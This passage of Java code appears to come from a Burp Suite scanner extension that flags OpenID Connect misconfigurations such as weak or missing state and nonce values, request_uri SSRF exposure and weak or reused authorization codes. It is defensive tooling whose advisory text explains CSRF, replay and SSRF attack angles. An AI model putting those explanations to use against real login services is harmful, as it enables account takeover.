                                                +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
                                                +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
                                        "Low",
                                        "Firm"
                                )
                        );
                    }
                }

                // Check for weak OpenID state values (i.e. insufficient length, only alphabetic, only numeric, etc.)
                if (stateParameter!=null) {
                    String stateValue = stateParameter.getValue();
                    if ( (stateValue.length() <= 5) || ( (stateValue.length() < 7) & ((stateValue.matches("[a-zA-Z]+")) || (stateValue.matches("[0-9]+")))) ) {
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int[] nonceOffset = new int[2];
                        int nonceStart = requestString.indexOf(stateValue);
                        nonceOffset[0] = nonceStart;
                        nonceOffset[1] = nonceStart+stateValue.length();
                        requestHighlights.add(nonceOffset);
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                        "[Flaw 8] OpenID Weak State Parameter",
                                        "The OpenID Flow presents a security misconfiguration because is using weak values for"
                                                +"the <code>state</code> parameter during OpenID login procedure.\n<br> "
                                                +"In details, the OpenID Flow request contains the following <code>state</code> parameter weak value <b>"+stateValue+"</b>.\n<br>"
                                                +"Based on OpenID specifications the <code>state</code> parameter should be used to maintain state between "
                                                +"the request and the callback, and to mitigate CSRF attacks. For these reasons its value should be unpredictable and unique "
                                                +"for usr's session.\n<br>When the <code>state</code> value is guessable (insufficient entropy) "
                                                +"then the attack surface of the OpenID service increases.\n<br>"
                                                +"If there are not in place other anti-CSRF protections then an attacker could potentially manipulate "
                                                +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                        "Low",
                                        "Firm"
                                )
                        );
                    }
                }



                // Checking for OpenID Flows with 'request_uri' parameter on authorization request
                if (requesturiParameter!=null) {
                    String reqUriValue = requesturiParameter.getValue();
                    List<int[]> matches = getMatches(requestString.getBytes(), reqUriValue.getBytes());
                    issues.add(
                            new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, matches, null) },
                                    "[Info] OpenID Flow with Request_Uri Parameter Detected",
                                    "The OpenID Flow uses the parameter <code>request_uri</code> set to <b>"+reqUriValue+"</b> in order to"
                                            +"enable the retrieving of client's Request-Object via a URI reference to it.\n<br>"
                                            +"Based on OpenID specifications the value of the <code>request_uri</code> parameter "
                                            +"is set to an URI pointing to a server hosting a JWT which contains the client's parameter values. "
                                            +"In this way the OpenID Provider can fetch the provided URI and retrieve the Request-Object "
                                            +"by parsing the JWT contents.\n<br>"
                                            +"For security reasons the URI value of <code>request_uri</code> parameter should be carefully validated "
                                            +"at server-side, otherwise a threat agent could be able to lead the OpenID Provider to interact with "
                                            +"an arbitrary server under is control and then potentially exploit SSRF vulnerabilities.\n<br>"
                                            +"As mitigation the OpenID Provider should define a whitelist of allowed URI values (pre-registered "
                                            +"during the client registration process) for the <code>request_uri</code> parameter.\n<br>"
                                            +"<br>References:<br>"
                                            +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2\">https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2</a><br>"
                                            +"<a href=\"https://portswigger.net/research/hidden-oauth-attack-vectors\">https://portswigger.net/research/hidden-oauth-attack-vectors</a>",
                                    "Information",
                                    "Certain"
                            )
                    );
                }

                // Checking for OpenID Token Exchange or JWT Bearer Flows
                if (reqParam!=null & grantParameter!=null) {
                    // First retrieves the grant_type parameter from request body
                    String grantType = "";
                    for (IParameter param: reqParam) {
                        if (param.getType() == IParameter.PARAM_BODY) {
                            if (param.getName().equals("grant_type")) {
                                grantType = param.getValue();
                            }
                        }
                    }

                    // Checking for OpenID Token Exchange Flow
                    if (helpers.urlDecode(grantType).equals("urn:ietf:params:oauth:grant-type:token-exchange")) {
                        // Found OpenID Token Exchange Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OpenID Token Exchange Flow Detected",
                                        "This is a OpenID Token Exchange Flow (RFC 8693) login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>"
                                                +"Note: the Token Exchange specification does not require client authentication and even client identification at the token endpoint, "
                                                +"in that cases it should be implemented only on closed network within a service.",
                                        "Information",
                                        "Certain"
                                )
                        );
                        // Checking for OpenID JWT Bearer Flow
                    } else if (helpers.urlDecode(grantType).equals("urn:ietf:params:oauth:grant-type:jwt-bearer")) {
                        // Found OpenID JWT Bearer Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OpenID JWT Bearer Flow Detected",
                                        "This is a OpenID JWT Bearer Flow (RFC 7523) login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>",
                                        "Information",
                                        "Certain"
                                )
                        );
                    }
                }



                // Checks for OpenID Flows login requests
                if ( ((reqQueryParam!=null & reqQueryParam.containsKey("client_id") & reqQueryParam.containsKey("response_type")) ||
                        ( reqParam!=null & (clientidParameter != null) & (resptypeParameter!=null))) ) {
                    stdout.println("[+] Passive Scan: OpenID Flow detected");
                    if (reqQueryParam.containsKey("redirect_uri") & reqQueryParam.containsKey("response_type")) {
                        respType = reqQueryParam.get("response_type");
                        redirUri = reqQueryParam.get("redirect_uri");
                    } else if ((redirParameter != null) & (resptypeParameter!=null)) {
                        respType = resptypeParameter.getValue();
                        redirUri = redirParameter.getValue();
                    }

                    // Checking for OpenID Implicit Flow
                    if (respType.equals("token") || respType.equals("id_token") || helpers.urlDecode(respType).equals("id_token token")){
                        // Found OpenID Implicit Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OpenID Implicit Flow Detected",
                                        "This is a login request of OpenID Implicit Flow, the <code>response_type</code> value is <b>"+helpers.urlDecode(respType)+"</b>.\n<br>"
                                                +"The OpenID Implicit Flow is deprecated and should be avoided, especially in Mobile, Native desktop and SPA application contexts (public clients).\n<br>",
                                        "Information",
                                        "Certain"
                                )
                        );
                        // Checking for OpenID Implicit Flow misconfiguration (missing nonce)
                        if (nonceParameter==null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 8] OpenID Implicit Flow without Nonce Parameter",
                                            "The OpenID Implicit Flow is improperly implemented because the mandatory <code>nonce</code> is missing.\n<br>"
                                                    +"Based on OpenID specifications this parameter should be unguessable and unique per client session "
                                                    +"in order to provide a security mitigation against replay attacks.\n<br>"
                                                    +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
                                                    +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
                                                    +"The Implicit Flow should be avoided in Mobile, Native desktop and SPA application contexts (public clients) because is inherently insecure.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#ImplicitAuthRequest\">https://openid.net/specs/openid-connect-core-1_0.html#ImplicitAuthRequest</a><br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
                                            "Medium",
                                            "Certain"
                                    )
                            );
                        }

                        // Checking for OpenID Implicit Flow Deprecated Implementation with access token in URL
                        if (respType.equals("token") || helpers.urlDecode(respType).equals("id_token token")) {
                            // If response_mode is set to form_post then the Implicit Flow is yet acceptable
                            if ( respmodeParameter==null || (!respmodeParameter.getValue().equals("form_post")) ) {
                                // Found dangerous implementation of OpenID Implicit Flow which exposes access tokens in URL
                                issues.add(
                                        new CustomScanIssue(
                                                baseRequestResponse.getHttpService(),
                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                                "OpenID Implicit Flow Insecure Implementation Detected",
                                                "This OpenID Implicit Flow implementation is inherently insecure, because allows the transmission of "
                                                        +"secret tokens on the URL of HTTP GET requests (usually on URL fragment).\n<br>This behaviour is deprecated by OpenID specifications "
                                                        +"because exposes the secret tokens to leakages (i.e. via cache, traffic sniffing, accesses from Javascript, etc.) and replay attacks.\n<br>"
                                                        +"If the use of OpenID Implicit Flow is needed then is suggested to use the <code>request_mode</code> set to "
                                                        +"<b>form_post</b> which force to send access tokens in the body of HTTP POST requests, or to"
                                                        +"adopt the OpenID Implicit Flow which uses only the ID_Token (not exposing access tokens) "
                                                        +"by setting <code>response_type</code> parameter to <b>id_token</b>.\n<br>"
                                                        +"The use of Implicit Flow is also considered insecure in Mobile, Native desktop and SPA application contexts (public clients).\n<br>"
                                                        +"<br>References:<br>"
                                                        +"<a href=\"https://openid.net/specs/oauth-v2-form-post-response-mode-1_0.html\">https://openid.net/specs/oauth-v2-form-post-response-mode-1_0.html</a>",
                                                "Medium",
                                                "Certain"
                                        )
                                );
                            }
                        }


                        // Checking for OpenID Hybrid Flow authorization requests
                    } else if ( (helpers.urlDecode(respType).equals("code id_token") || helpers.urlDecode(respType).equals("code token") || helpers.urlDecode(respType).equals("code id_token token")) ) {
                        // Checking for Duplicate Code value issues on OpenID Hybrid Flow
                        if (!GOTCODES.isEmpty()) {
                            String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
                                // This is needed to avoid null values on respDate
                                respDate = Long.toString(currentTimeStampMillis);
                            }
                            // Start searching of authorization code duplicates
                            for (Map.Entry<String,List<String>> entry : GOTCODES.entrySet()) {
                                List<String> codeList = entry.getValue();
                                String codeDate = entry.getKey();
                                for (String codeValue: codeList) {
                                    if (responseString.toLowerCase().contains(codeValue.toLowerCase()) & (! codeDate.equals(respDate))) {
                                        // This Hybrid Flow response contains an already released Code
                                        List<int[]> matches = getMatches(responseString.getBytes(), codeValue.getBytes());
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
                                                        "OpenID Hybrid Flow Duplicate Code Value Detected",
                                                        "The Authorization Server seems issuing duplicate values for <code>code</code> parameter "
                                                                +"during the OpenID Hybrid Flow login procedure.\n<br>"
                                                                +"In details, the authorization response contains the following <code>code</code> value <b>"+codeValue+"</b> which was already released.\n<br>"
                                                                +"For security reasons the OpenID specifications recommend that authorization code must be unique for each user's session.\n<br>"
                                                                +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated authorization code "
                                                                +"values in the burp-proxy history.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation\">https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }

                        // Retrieving codes from OpenID Hybrid Flow responses body or Location header
                        if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                            // Enumerate OpenID authorization codes returned by HTTP responses
                            String dateCode = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                // This is needed to avoid null values on GOTCODES
                                dateCode = Long.toString(currentTimeStampMillis);
                            }
                            List<String> foundCodes = new ArrayList<>();
                            for (String pName : SECRETCODES) {
                                // Check if already got code in same response (filtering by date)
                                if (!GOTCODES.containsKey(dateCode)) {
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                    foundCodes.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, "link"));
                                    // Remove duplicate codes found in same response
                                    foundCodes = new ArrayList<>(new HashSet<>(foundCodes));
                                    if (!foundCodes.isEmpty()) {
                                        GOTCODES.put(dateCode, foundCodes);
                                        // Check for weak code issues (guessable values)
                                        for (String fCode : foundCodes) {
                                            if (fCode.length()<6) {
                                                // Found a weak code
                                                List<int[]> responseHighlights = new ArrayList<>(1);
                                                int[] tokenOffset = new int[2];
                                                int tokenStart = responseString.indexOf(fCode);
                                                tokenOffset[0] = tokenStart;
                                                tokenOffset[1] = tokenStart+fCode.length();
                                                responseHighlights.add(tokenOffset);
                                                issues.add(
                                                        new CustomScanIssue(
                                                                baseRequestResponse.getHttpService(),
                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, responseHighlights) },
                                                                "OpenID Weak Authorization Code Value Detected",
                                                                "The OpenID Hybrid Flow presents a security misconfiguration, the Authorization Server releases weak <code>code</code> values "
                                                                        +"(insufficient entropy) during the login procedure.\n<br>"
                                                                        +"In details, the OpenID Flow response contains a <code>code</code> value of <b>"+fCode+"</b>.\n<br>"
                                                                        +"Based on OpenID specifications for security reasons the <code>code</code> must be unpredictable and unique "
                                                                        +"per client session.\n<br>Since the <code>code</code> value is guessable (insufficient entropy) "
                                                                        +"then the attack surface of the OpenID service increases.\n<br>"
                                                                        +"<br>References:<br>"
                                                                        +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                                "High",
                                                                "Firm"
                                                        )
                                                );
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        // Checking for OpenID Hybrid Flow without anti-CSRF protection
                        //if ( (!reqQueryParam.containsKey("state")) || (stateParameter == null)) {
                        if (stateParameter == null){
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 8] OpenID Hybrid Flow without State Parameter",
                                            "The OpenID Hybrid Flow authorization request does not contains the <code>state</code> parameter.\n<br>"
                                                    +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
                                                    +"<code>state</code> parameter (generated from some private information about the user), "
                                                    +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
                                                    +"If there are not in place other anti-CSRF protections then an attacker could manipulate "
                                                    +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                        } else {
                            String stateValue = stateParameter.getValue();
                            if (responseString.toLowerCase().contains(stateValue.toLowerCase())) {
                                // Checking for OpenID Hybrid Flow with Duplicate State value issues (potential constant state values)
//                                if (! GOTSTATES.isEmpty()) {
//                                    String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
//                                    if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
//                                        // This is needed to avoid null values on respDate
//                                        respDate = Long.toString(currentTimeStampMillis);
//                                    }
//                                    // Start searching if last issued authorization code is a duplicated of already received codes
//                                    for (Map.Entry<String,List<String>> entry : GOTSTATES.entrySet()) {
//                                        List<String> stateList = entry.getValue();
//                                        String stateDate = entry.getKey();
//                                        for (String stateVal: stateList) {
//                                            if (responseString.toLowerCase().contains(stateVal.toLowerCase()) & (! stateDate.equals(respDate))) {
//                                                // This Hybrid Flow response contains an already released State
//                                                List<int[]> matches = getMatches(responseString.getBytes(), stateVal.getBytes());
//                                                issues.add(
//                                                        new CustomScanIssue(
//                                                                baseRequestResponse.getHttpService(),
//                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
//                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
//                                                                "[Flaw 2] OpenID Hybrid Flow Duplicate State Parameter Detected",
//                                                                "The OpenID Authorization Server seems issuing duplicate values for the <code>state</code> parameter, "
//                                                                        +"during the login procedure.\n<br>"
//                                                                        +"In details, the authorization response contains the following <code>state</code> value <b>"+stateVal+"</b> which was already released.\n<br>"
//                                                                        +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
//                                                                        +"<code>state</code> parameter, (generated from some private information about the user), "
//                                                                        +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
//                                                                        +"The authorization response contains the following already released <code>state</code> value <b>"+stateVal+"</b>\n<br>"
//                                                                        +"Using constant values for the <code>state</code> parameter de-facto disables its anti-CSRF protection.\n"
//                                                                        +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
//                                                                        +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
//                                                                        +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated <code>state</code> parameter values "
//                                                                        +"in the burp-proxy history.\n<br>"
//                                                                        +"<br>References:<br>"
//                                                                        +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
//                                                                "Medium",
//                                                                "Tentative"
//                                                        )
//                                                );
//                                            }
//                                        }
//                                    }
//                                }

                                // Retrieving 'state' values from OpenID Hybrid Flow responses body or Location header
                                if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                                    // Enumerate OpenID authorization states returned by HTTP responses
                                    String dateState = getHttpHeaderValueFromList(respHeaders, "Date");
                                    if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                        // This is needed to avoid null values on GOTSTATES
                                        dateState = Long.toString(currentTimeStampMillis);
                                    }
                                    List<String> foundStates = new ArrayList<>();
                                    // Check if already got state in same response (filtering by date)
                                    if (! GOTSTATES.containsKey(dateState)) {
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                        foundStates.addAll(getMatchingParams("state", "state", getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, "link"));
                                        // Remove duplicate states found in same response
                                        foundStates = new ArrayList<>(new HashSet<>(foundStates));
                                        if (!foundStates.isEmpty()) {
                                            GOTSTATES.put(dateState, foundStates);
                                        }
                                    }
                                } else {
                                    // The response does not return the state parameter received within the authorization request
                                    List<int[]> reqMatches = getMatches(requestString.getBytes(), stateValue.getBytes());
                                    List<int[]> respMatches = getMatches(responseString.getBytes(), stateValue.getBytes());
                                    if (respMatches.isEmpty()) {
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, reqMatches, null) },
                                                        "[Flaw 8] OpenID Hybrid Flow State Parameter Mismatch Detected",
                                                        "The Authorization Server does not send in response the same <code>state</code> parameter "
                                                                +"received in the authorization request during the OpenID login procedure.\n<br>"
                                                                +"In details, the response does not contains the same <code>state</code> value <b>"+stateValue+"</b> sent within the authorization request\n<br>"
                                                                +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
                                                                +"<code>state</code> parameter, (generated from some private information about the user), "
                                                                +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
                                                                +"Then for security reasons this mechanism requires that when the Authorization Server receives a <code>state</code> parameter "
                                                                +"its response must contain the same <code>state</code> value, then this misconfiguration disables its anti-CSRF protection.\n<br>"
                                                                +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
                                                                +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }


                        // Checking for OpenID Hybrid Flow Misconfiguration on authorization responses
                        // the OpenID authorization response have to return the 'code' parameter with at least one of 'acces_token' or 'id_token' parameters
                        if ( (respInfo.getStatusCode()==200 || respInfo.getStatusCode()==302) & ( responseString.contains("code")) ) {
                            if ( !responseString.contains("id_token") & !responseString.contains("access_token")) {
                                issues.add(
                                        new CustomScanIssue(
                                                baseRequestResponse.getHttpService(),
                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                                "OpenID Hybrid Flow Missing Tokens in Authorization Response",
                                                "The OpenID Hybrid Flow presents a misconfiguration on the returned authorization response, because "
                                                        +"both the <code>id_token</code> and the <code>access_token</code> parameters are missing.\n<br>"
                                                        +"Based on OpenID Hybrid Flows specifications along with the <code>code</code> parameter the "
                                                        +"authorization response have to return: the parameter <code>id_token</code> "
                                                        +"when requests have the <code>response_type</code> parameter set to <b>code id_token token</b> "
                                                        +"or the parameter <code>access_token</code> when requests have the <code>response_type</code> parameter set "
                                                        +"to any of the values <b>code token</b> or <b>code id_token token</b>.\n<br> "
                                                        +"The information contained on the <code>id_token</code> tells to the "
                                                        +"Client Application that the user is authenticated (it can also give additional information "
                                                        +"like his username or locale).\n<br>The absence of the <code>id_token</code> and the "
                                                        +"<code>access_token</code> parameters increases the attack surface of the OpenID service.\n<br>"
                                                        +"<br>References:<br>"
                                                        +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#HybridFlowSteps\">https://openid.net/specs/openid-connect-core-1_0.html#HybridFlowSteps</a>",
                                                "Medium",
                                                "Certain"
                                        )
                                );
                            }
                        }

                        // Checking for OpenID Hybrid Flow misconfiguration (missing nonce)
                        if (nonceParameter==null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 8] OpenID Hybrid Flow without Nonce Parameter",
                                            "The OpenID Hybrid Flow is improperly implemented because the mandatory <code>nonce</code> is missing.\n<br>"
                                                    +"Based on OpenID specifications this parameter should be unguessable and unique per "
                                                    +"client session in order to provide a security mitigation against replay attacks.\n<br>"
                                                    +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
                                                    +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
                                            "Low",
                                            "Firm"
                                    )
                            );
                        }

                        // Found OpenID Hybrid Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OpenID Hybrid Flow Detected",
                                        "This is a login request of OpenID Hybrid Flow, the <code>response_type</code> value is <b>"+helpers.urlDecode(respType)+"</b>.",
                                        "Information",
                                        "Certain"
                                )
                        );


                        // Checking OpenID Authorization Code Flow
                    } else if (respType.equals("code")) {
                        // Found OpenID Authorization Code Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OpenID Authorization Code Flow Detected",
                                        "This is a login request of OpenID Authorization Code Flow, the <code>response_type</code> value is <b>"+helpers.urlDecode(respType)+"</b>.",
                                        "Information",
                                        "Certain"
                                )
                        );
                        // Checking for Duplicate Code value issues on OpenID Authorization Code Flow
                        if (! GOTCODES.isEmpty()) {
                            String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
                                // This is needed to avoid null values on respDate
                                respDate = Long.toString(currentTimeStampMillis);
                            }
                            // Start searching if last issued authorization code is a duplicated of already received codes
                            for (Map.Entry<String,List<String>> entry : GOTCODES.entrySet()) {
                                List<String> codeList = entry.getValue();
                                String codeDate = entry.getKey();
                                for (String codeValue: codeList) {
                                    if (responseString.toLowerCase().contains(codeValue.toLowerCase()) & (! codeDate.equals(respDate))) {
                                        // This Authorization Code Flow response contains an already released Code
                                        List<int[]> matches = getMatches(responseString.getBytes(), codeValue.getBytes());
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
                                                        "OpenID Authorization Code Flow Duplicate Code Value Detected",
                                                        "The Authorization Server releases duplicate values for <code>code</code> parameter "
                                                                +"during OpenID Authorization Code Flow login procedure.\n<br>"
                                                                +"In details, the authorization response contains the following <code>code</code> value <b>"+codeValue+"</b> which was already released.\n<br>"
                                                                +"For security reasons the OpenID specifications recommend that authorization code must be unique for each user's session.\n<br>"
                                                                +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated authorization code "
                                                                +"values in the burp-proxy history.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation\">https://openid.net/specs/openid-connect-core-1_0.html#TokenRequestValidation</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }
                        // Retrieving codes from OpenID Authorization Code Flow responses body or Location header
                        if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                            // Enumerate OpenID authorization codes returned by HTTP responses
                            String dateCode = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                // This is needed to avoid null values on GOTCODES
                                dateCode = Long.toString(currentTimeStampMillis);
                            }
                            List<String> foundCodes = new ArrayList<>();
                            for (String pName : SECRETCODES) {
                                // Check if already got code in same response (filtering by date)
                                if (! GOTCODES.containsKey(dateCode)) {
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                    foundCodes.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, "link"));
                                    // Remove duplicate codes found in same response
                                    foundCodes = new ArrayList<>(new HashSet<>(foundCodes));
                                    if (!foundCodes.isEmpty()) {
                                        GOTCODES.put(dateCode, foundCodes);
                                        // Check for weak code issues (guessable values)
                                        for (String fCode : foundCodes) {
                                            if (fCode.length()<6) {
                                                // Found a weak code
                                                List<int[]> responseHighlights = new ArrayList<>(1);
                                                int[] tokenOffset = new int[2];
                                                int tokenStart = responseString.indexOf(fCode);
                                                tokenOffset[0] = tokenStart;
                                                tokenOffset[1] = tokenStart+fCode.length();
                                                responseHighlights.add(tokenOffset);
                                                issues.add(
                                                        new CustomScanIssue(
                                                                baseRequestResponse.getHttpService(),
                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, responseHighlights) },
                                                                "OpenID Weak Authorization Code Value Detected",
                                                                "The OpenID Authorization Code Flow presents a security misconfiguration, the Authorization Server releases weak <code>code</code> values "
                                                                        +"(insufficient entropy) during OpenID login procedure.\n<br>"
                                                                        +"In details, the OpenID Flow response contains a <code>code</code> value of <b>"+fCode+"</b>.\n<br>"
                                                                        +"Based on OpenID specifications for security reasons the <code>code</code> must be unpredictable and unique "
                                                                        +"per client session.\n<br>Since the <code>code</code> value is guessable (insufficient entropy) "
                                                                        +"then the attack surface of the OpenID service increases.\n<br>"
                                                                        +"<br>References:<br>"
                                                                        +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                                "High",
                                                                "Firm"
                                                        )
                                                );
                                            }
                                        }
                                    }
                                }
                            }
                        }


                        // Checking for OpenID Authorization Code Flow without anti-CSRF protection
                        //if ( (!reqQueryParam.containsKey("state")) || (stateParameter == null)) {
                        if (stateParameter == null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 8] OpenID Authorization Code Flow without State Parameter Detected",
                                            "The OpenID Authorization Code Flow login request does not contains the <code>state</code> parameter.\n<br>"
                                                    +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
                                                    +"<code>state</code> parameter (generated from some private information about the user), "
                                                    +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
